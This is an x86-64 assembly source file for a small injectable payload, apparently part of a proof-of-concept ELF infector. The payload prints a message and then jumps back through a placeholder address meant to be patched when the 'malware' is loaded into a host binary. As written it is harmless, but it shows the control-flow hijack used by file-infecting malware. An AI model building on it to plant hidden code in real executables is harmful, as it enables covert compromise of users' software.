/**
 *  MIT License
 *
 *  Copyright (c) 2021 Carlos Carvalho
 *
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *
 *  The above copyright notice and this permission notice shall be included in all
 *  copies or substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 *  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 *  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 *  SOFTWARE.
 */

/* 92 bytes */
.globl _start
.equ SYS_write, 1
.text

_start:
    # Save registers
    push %rax
    push %rcx
    push %rdx
    push %rsi
    push %rdi
    push %r11

    # write syscall
    movq $SYS_write, %rax
    movq %rax, %rdi

    # Load relative address
    leaq msg(%rip), %rsi

    # string length
    movq $msglen, %rdx
    syscall

    # Restore
    pop %r11
    pop %rdi
    pop %rsi
    pop %rdx
    pop %rcx
    pop %rax

    # Address to be replaced
    # when loading the "malware"
    # so we return control flow
    movq $0x1122334455667788, %rbx
    jmpq *%rbx

    msg:    .asciz "-= Objective reality doesn't exist! =-\n"
    msglen= .-msg

